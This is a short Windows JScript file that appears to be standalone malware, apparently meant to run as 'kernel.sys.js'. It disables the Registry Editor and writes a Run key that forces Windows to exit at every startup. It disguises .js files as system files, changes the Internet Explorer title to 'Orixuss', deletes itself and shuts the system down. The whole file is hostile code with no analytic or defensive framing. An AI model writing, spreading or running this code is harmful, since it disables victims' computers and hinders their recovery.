SHELL=WScript.CreateObject("WScript.Shell");
SHELL.regwrite("HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\DisableRegistryTools",1,"REG_DWORD");

fso=WScript.CreateObject("Scripting.FileSystemObject");
dirWin=fso.GetSpecialFolder(0);
SHELL.regWRITE("HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\Rundll",dirWin+"\\"+"rundll32.exe user,ExitWindows");
SHELL.regWrite("HKCR\\JSFile\\DefaultIcon\\",dirWin+"\\SYSTEM\\shell32.dll,-154");
SHELL.regWrite("HKCR\\JSFile\\","System File");
SHELL.regWrite("HKLM\\SOFTWARE\\Microsoft\\windows\\Internet Explorer\\Main\\WindowTitle","Orixuss");
fso.deletefile("kernel.sys.js");
SHELL.Run("rundll32.exe user,ExitWindows");
